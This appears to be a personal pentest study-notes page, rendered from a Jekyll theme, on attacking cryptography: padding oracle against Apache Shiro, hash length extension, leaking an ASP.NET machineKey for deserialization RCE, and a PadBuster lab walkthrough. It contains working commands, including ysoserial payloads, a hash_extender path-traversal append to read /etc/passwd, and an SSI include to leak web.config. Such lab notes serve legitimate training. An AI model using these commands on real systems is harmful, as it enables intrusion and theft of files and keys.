@@ -1,0 +1,1062 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>12 - Attacking Crypto |</title>
+<meta name="description" content="Padding Oracle, Hash Length Extension, Leveraging MachineKey and More ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="12 - Attacking Crypto">
+<meta property="og:url" content="http://localhost:4000/notes/ewptx/crypto/">
+
+
+  <meta property="og:description" content="Padding Oracle, Hash Length Extension, Leveraging MachineKey and More ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header1.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-04T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ewptx/crypto/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header1.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          12 - Attacking Crypto
+
+        
+      </h1>
+      
+        <p class="page__lead">Padding Oracle, Hash Length Extension, Leveraging MachineKey and More
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  10 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/" class="active">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="12 - Attacking Crypto">
+    <meta itemprop="description" content="Padding Oracle, Hash Length Extension, Leveraging MachineKey and More">
+    <meta itemprop="datePublished" content="2023-12-04T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#attacking-crypto">Attacking Crypto</a>
+    <ul>
+      <li><a href="#what-is-a-padding-oracle">What is a Padding Oracle</a></li>
+      <li><a href="#padding-oracle-attack-scenario">Padding Oracle Attack Scenario</a></li>
+      <li><a href="#fundamentals">Fundamentals</a></li>
+      <li><a href="#hash-length-extension-scenario">Hash length extension Scenario</a></li>
+      <li><a href="#the-importance-of-machinekey">The importance of machineKey</a></li>
+      <li><a href="#subverting-hmac-scenario">Subverting HMAC Scenario</a></li>
+      <li><a href="#lab">Lab</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="attacking-crypto">Attacking Crypto</h1>
+
+<ul>
+  <li>Padding Oracle Attack</li>
+  <li>Hash Length Extension Attack</li>
+  <li>Leveraging machineKey</li>
+  <li>Subverting HMAC in Node.js</li>
+</ul>
+
+<h2 id="what-is-a-padding-oracle">What is a Padding Oracle</h2>
+<p>In web app an Oracle is any application functionality, error message or behavior that can reveal valuable information</p>
+
+<ul>
+  <li>https://robertheaton.com/2013/07/29/padding-oracle-attack/</li>
+  <li>This attack leverages proper and improper padding as a means of gaining application information</li>
+</ul>
+
+<p>CBC-mode decryption funcions operating with PLCS7-mode padding</p>
+
+<ul>
+  <li>http://seffyvon.github.io/cryptography/2014/08/20/CBC-Padding-Oracle-Attacks/</li>
+  <li>A padding oracle can reveal if the padding is correct For a given ciphertext.</li>
+</ul>
+
+<p>Another resource:</p>
+
+<ul>
+  <li>http://netifera.com/research/poet/PaddingOracleBHEU10.pdf</li>
+</ul>
+
+<h3 id="intermediate-values">Intermediate Values</h3>
+<p>Are the output of the block cipher during the block cipher process</p>
+
+<p>Essentially, they can be seen as the state of a ciphertext block after decryption and before the XOR operation with the previous ciphertext block</p>
+
+<p>Once intermediate bytes are found, deciphering the plaintext of the corresponding ciphertext is easy</p>
+
+<h2 id="padding-oracle-attack-scenario">Padding Oracle Attack Scenario</h2>
+<p>Scenario of attack against Apache Shiro</p>
+
+<p>Apache Shiro is a Java Security framework that has functions to perform authentication, authorization, password, and session management.</p>
+
+<ul>
+  <li>older shiro versions suffered from a Padding Oracle Vulnerability, that when chained with a another deserialization-based vulnerability could result in RCE</li>
+  <li>Shiro used the AES-128-CBC mode to encrypt cookies enabling Padding Oracle attacks.</li>
+</ul>
+
+<p>Moreover:</p>
+
+<ul>
+  <li>https://www.anquanke.com/post/id/192819</li>
+</ul>
+
+<h3 id="creating-vulnerable-environment">Creating vulnerable environment</h3>
+<p>We have set up our own vuln environment using Apache Shiro 1.4.1 + tomcat:8-jre8</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/apache/shiro.git
+<span class="nb">cd </span>shiro
+git checkout shiro-root-1.4.1
+mvn <span class="nb">install
+cd </span>samples/web
+mvn <span class="nb">install</span>
+</code></pre></div></div>
+
+<p>Copy the samples-web-1.4.1.war package (samples/target) obtained after compilation to the Tomcat webapps directory</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start tomcat
+</code></pre></div></div>
+
+<h3 id="the-attack">The attack</h3>
+
+<p>1 - Grab cookie with BURP</p>
+
+<p>2 - Create a serialized payload with YsoSerial:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ysoserial-master-30099844c6-1.jar CommonsBeanutils1 <span class="s2">"touch /tmp/Success"</span> <span class="o">&gt;</span> payload.class
+</code></pre></div></div>
+
+<p>3 - Download the publicly available exploit:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
+<span class="c"># use to captures the 'remember me' cookie as a prefix For the Padding Oracle attack</span>
+</code></pre></div></div>
+
+<p>4 - After a couple hours the exploit script provided us with a valid cookie containing our payload. This cookie will be deserialized by the vuln server</p>
+
+<p>5 - Use BURP Repeater to issued a request with out crafted cookie.</p>
+
+<blockquote>
+  <p>The Padding Oracle Attacks are Chosen-Ciphertext Attacks (CCA)</p>
+</blockquote>
+
+<h2 id="fundamentals">Fundamentals</h2>
+<p>There are web apps that prepend a secret value to data, hash this value with a flawed algorithm and provides the user with both data and the hash, but not the secret</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># On other part of the communication, the server relies on the secret For data validation purposes
+# An attacker that does not know the value of the secret can still generate a valid hash For 
+{secret || data || attacker_controlled_data}.
+
+# An attacker can calculate a valid hash For a message without knowing the value of the secret. 
+# He can do that by just guessing its length. Hashes are calculated in blocks and the hash of one block is the state For the next block.
+</code></pre></div></div>
+
+<p>Example</p>
+
+<p>Request:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">stock_quantity</span><span class="o">=</span>20&amp;price<span class="o">=</span>1000
+</code></pre></div></div>
+
+<p>Hash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>secretpass|stock_quantity<span class="o">=</span>20&amp;price<span class="o">=</span>1000|padding] <span class="o">=&gt;</span> Hash1/State1
+</code></pre></div></div>
+
+<p>Final Request:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">stock_quantity</span><span class="o">=</span>20&amp;price<span class="o">=</span>1000&amp;hash<span class="o">=</span>Hash1
+</code></pre></div></div>
+
+<blockquote>
+  <p>If an attacker manages to identify the length of padding, he will have all the info needed to calculate a new hash.</p>
+</blockquote>
+
+<p>Attack Hash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>secretpass|stock_quantity<span class="o">=</span>20&amp;price<span class="o">=</span>1000|padding|&amp;price<span class="o">=</span>100]
+</code></pre></div></div>
+
+<p>Attack Hash:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>State1|&amp;price<span class="o">=</span>10]<span class="o">=&gt;</span>Hash2/State2
+</code></pre></div></div>
+
+<p>Final Request:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">stock_quantity</span><span class="o">=</span>20&amp;price<span class="o">=</span>1000+padding&amp;price<span class="o">=</span>100&amp;hash<span class="o">=</span>Hash2
+</code></pre></div></div>
+
+<p>Moreover the calculations required during Hash Length Extension Attacks:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks
+</code></pre></div></div>
+
+<h2 id="hash-length-extension-scenario">Hash length extension Scenario</h2>
+<ul>
+  <li>https://github.com/SpiderLabs/CryptOMG</li>
+</ul>
+
+<p>Challenge 5 is what we need to witness how a hash length extension can be performed</p>
+
+<p>Lets try reading the contents of /etc/passwd by executing the attack</p>
+
+<p>We dont need to know the secret value being used. We only need to successfully guess the length of the secret.</p>
+
+<p>For this task we can use <strong>hash_extender</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#  https://github.com/iagox86/hash_extender</span>
+<span class="c"># The specify a known hash value</span>
+<span class="c"># The specify an estimation regarding the secrets length (between 10 and 40 bytes)</span>
+<span class="c"># We will have to experiment with the amount of ../../ to be used</span>
+
+./hash_extender <span class="nt">-f</span> sha1 <span class="nt">--data</span> <span class="s1">'test'</span> <span class="nt">-s</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">--append</span> <span class="s1">'../../../../../../../../../etc/passwd'</span> <span class="nt">--secret-min</span><span class="o">=</span>10 <span class="nt">--secret-max</span><span class="o">=</span>40 <span class="nt">--out-data-format</span><span class="o">=</span>html <span class="nt">--table</span> <span class="o">&gt;</span> payloads.out
+</code></pre></div></div>
+
+<ul>
+  <li>Now use the payloads.out inside the BURP Intruder</li>
+  <li>we will follow a Sniper approach</li>
+</ul>
+
+<blockquote>
+  <p>Eventually, we are able to see the content of /etc/passwd by means of a Hash Length Extension Attack.</p>
+</blockquote>
+
+<p><img src="/assets/images/posts/ewptx/67.png" alt="Alt text" class="align-center" /></p>
+
+<h2 id="the-importance-of-machinekey">The importance of machineKey</h2>
+<ul>
+  <li>https://msdn.microsoft.com/en-us/data/w8h3skw9(v=vs.110)</li>
+</ul>
+
+<p>Its a feature used to specify encryption settings For application services, such as view state, forms authentication and roles in a system.</p>
+
+<ul>
+  <li>Machine Key contains a set of fields like validation key, decryption key and so on where unique keys are to be entered.</li>
+</ul>
+
+<p><img src="/assets/images/posts/ewptx/68.png" alt="Alt text" class="align-center" /></p>
+
+<p><img src="/assets/images/posts/ewptx/69.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="leveraging-a-leaked-machinekey-for-rce">Leveraging a leaked machineKey for RCE</h3>
+<p>Scenario, we are pentesting a .NET application</p>
+
+<ol>
+  <li>The application offers file uploading functionality (the ‘aspx’, ‘.config’,’.ashx’, ‘.asmx’, ‘aspq’, ‘.axd’,’.cshtml’,’.cshtml’,’.rem’,’.soap’,’.vbhtm’, ‘.vbhtml’,’.asa’,’.asp’, and ‘.cer’ extensions are blacklisted.</li>
+  <li>Validation of viewstate MAC is performed (this prevents deserialization exploitation without knowing the cryptographic key - machineKey)</li>
+</ol>
+
+<blockquote>
+  <p>Our only change is to find the <strong>machine Key</strong></p>
+</blockquote>
+
+<p>We can try uploading the following, in attempt to leak the machine key:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--</span><span class="err">#</span><span class="nx">include</span> <span class="nx">file</span><span class="o">=</span><span class="dl">"</span><span class="s2">..</span><span class="se">\</span><span class="s2">..</span><span class="se">\</span><span class="s2">web.config</span><span class="dl">"</span> <span class="o">--&gt;</span>
+<span class="c1">// test.shtml</span>
+</code></pre></div></div>
+
+<p>Attempt successfull, we can open view source code to retrieve its contents</p>
+
+<p>Now we need to figure out how the MAC generated and verified:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://referencesource.microsoft.com/#system.web/UI/ObjectStateFormatter.cs
+- https://referencesource.microsoft.com/#System.Web/Configuration/MachineKeySection.cs
+</code></pre></div></div>
+
+<p>If u read the above, u will conclude to the below logic:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- MAC_HASH = MD5(serialized_data_binary + validation_key + 0x00000000)
+- VIEWSTATE = Base64_Encode(serialized_data_binary + MAC_HASH)
+</code></pre></div></div>
+
+<h3 id="exploitation">Exploitation</h3>
+<p>We need the <strong>YsoSerial.net</strong> and to implement the MAC-related logic of the previous information</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe <span class="nt">-o</span> <span class="nb">base64</span> <span class="nt">-g</span> TypeConfuDelegate <span class="nt">-f</span> ObjectStateformatter <span class="nt">-c</span> <span class="s2">"cmd /c ping &lt;attacker ip&gt;"</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/70.png" alt="Alt text" class="align-center" /></p>
+
+<blockquote>
+  <p>In this case, we did not attack crypto per se. Instead, we leveraged the SSI feature of the underlying server to leak the cryptographic key</p>
+</blockquote>
+
+<blockquote>
+  <p>Implementing strong crypto is important, but protecting the cryptographic key is of equal importance.</p>
+</blockquote>
+
+<h2 id="subverting-hmac-scenario">Subverting HMAC Scenario</h2>
+<p>Example of HMAC can be subverted through Remote Memory Disclosure in Node.js</p>
+
+<p>The source code of the vuln app will be provided, so we can try the attack locally</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://en.wikipedia.org/wiki/HMAC
+</code></pre></div></div>
+
+<h2 id="lab">Lab</h2>
+
+<h3 id="setup-code">Setup code</h3>
+
+<ul>
+  <li>https://github.com/GDSSecurity/PaddingOracleDemos</li>
+</ul>
+
+<p>Solution</p>
+
+<p>Step 1: Open the lab link to access the Kali GUI instance.</p>
+
+<p>…</p>
+
+<p>Step 2: Check if the provided machine/domain is reachable.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c3</span> demo.ine.local
+</code></pre></div></div>
+
+<ul>
+  <li>The provided machine is reachable.</li>
+</ul>
+
+<p>Step 3: Check open ports on the provided machine.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> demo.ine.local
+</code></pre></div></div>
+
+<blockquote>
+  <p>Port 80 is open on the target server. Werkzeug httpd server is running on that port.</p>
+</blockquote>
+
+<p>Step 4: Check the web application available on port 80.</p>
+
+<p>Encrypt the following plaintext:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ApplicationUsername</span><span class="o">=</span>user&amp;Password<span class="o">=</span>sesame
+</code></pre></div></div>
+
+<ul>
+  <li>Visit the following URL for encrypting the above plaintext (make sure to URL encode the = and &amp; characters):</li>
+</ul>
+
+<p>URL: http://demo.ine.local/encrypt?plain=ApplicationUsername%3duser%26Password%3dsesame</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Encrypted text is: 6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre></div></div>
+
+<p>Step 5: Decrypt the ciphertext.</p>
+
+<p>To decrypt the ciphertext, we can visit the /echo endpoint and provide the ciphertext:</p>
+
+<p>URL: http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80</p>
+
+<blockquote>
+  <p>The plaintext message was successfully retrieved.</p>
+</blockquote>
+
+<p>Step 6: Confirm a padding oracle’s presence.</p>
+
+<p>A padding oracle’s presence can be identified as follows - Try to tamper with the correct encrypted string and notice the exceptions (notice the “gg” part at the beginning of the ciphertext):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://demo.ine.local/echo?cipher<span class="o">=</span>gg664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
+</code></pre></div></div>
+
+<ul>
+  <li>Notice the exception. The application expected hexadecimal digits but found non-hexadecimal digits instead (letter ‘g’).</li>
+</ul>
+
+<p>Now check the response from the following URL:</p>
+
+<ul>
+  <li>URL: http://demo.ine.local/echo?cipher=g</li>
+</ul>
+
+<p>Now check the response from the following URL:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://demo.ine.local/echo?cipher<span class="o">=</span>6b
+</code></pre></div></div>
+
+<p>These errors may suggest that:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- The string consists of hexadecimal characters <span class="o">(</span>0-0xff<span class="o">)</span>
+- The string has to be aligned to two characters
+- The string is being decrypted somehow
+</code></pre></div></div>
+
+<ul>
+  <li>Since different strings produced different exceptions, there might be a chance to perform a padding oracle attack here.</li>
+</ul>
+
+<p>Step 7: Decrypt the encrypted data by performing a padding oracle attack.</p>
+
+<blockquote>
+  <p>PadBuster is started with the following arguments in our attempt to decrypt the encrypted data:</p>
+</blockquote>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>padbuster <span class="s2">"http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80"</span> <span class="s2">"6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80"</span> 16 <span class="nt">-encoding</span> 1
+</code></pre></div></div>
+
+<p>The following are the options provided to the PadBuster tool:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- The target URL containing the ciphertext
+- The ciphertext itself
+- Block size <span class="o">(</span>128 bits <span class="o">=</span> 16 bytes<span class="o">)</span>
+- Encoding <span class="nb">type </span>1 <span class="o">=</span> lowercase hex <span class="o">(</span>which was confirmed by experimenting with the endpoint <span class="k">in </span>the previous step<span class="o">)</span>
+</code></pre></div></div>
+
+<p>You would be prompted with the following message:</p>
+
+<p>Enter an ID that matches the error condition NOTE: The ID# marked with ** is recommended :</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter 2.
+</code></pre></div></div>
+
+<blockquote>
+  <p>Padbuster was able to recover two blocks of the plaintext message:</p>
+</blockquote>
+
+<p>Block 1 Results:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Cipher Text <span class="o">(</span>HEX<span class="o">)</span>: b8f1335522753d45174435c16b52dc2e
+<span class="o">[</span>+] Intermediate Bytes <span class="o">(</span>HEX<span class="o">)</span>: 0a0b2bcd40ec8741c671cc45c25ae140
+<span class="o">[</span>+] Plain Text: <span class="nv">ame</span><span class="o">=</span>user&amp;Passwor
+</code></pre></div></div>
+
+<p>Block 2 Results:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Cipher Text <span class="o">(</span>HEX<span class="o">)</span>: 5bbd4363b9d91d4c9100beae6ce34e80
+<span class="o">[</span>+] Intermediate Bytes <span class="o">(</span>HEX<span class="o">)</span>: dccc4030511450201f4c3dc9635ad426
+<span class="o">[</span>+] Plain Text: <span class="nv">d</span><span class="o">=</span>sesame
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Decrypted value: <span class="nv">ame</span><span class="o">=</span>user&amp;Password<span class="o">=</span>sesame
+</code></pre></div></div>
+
+<p>PadBuster revealed that behind the encrypted string, there is the <strong>ame=user&amp;Password=sesame</strong> string.</p>
+
+<p>However, if you take a look at the decrypted blocks, they are just 2/3 of the entire ciphertext.</p>
+
+<p>The first part, which is equal to 1/3 of the length, was not decrypted. It may contain other parameters or the full name of the first parameter.</p>
+
+<blockquote>
+  <p>This happened because the first block is XOR’d with the initialization vector (IV), which is not known to us.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Image Source: https://samsclass.info/141/proj/p11pad9.png
+</code></pre></div></div>
+
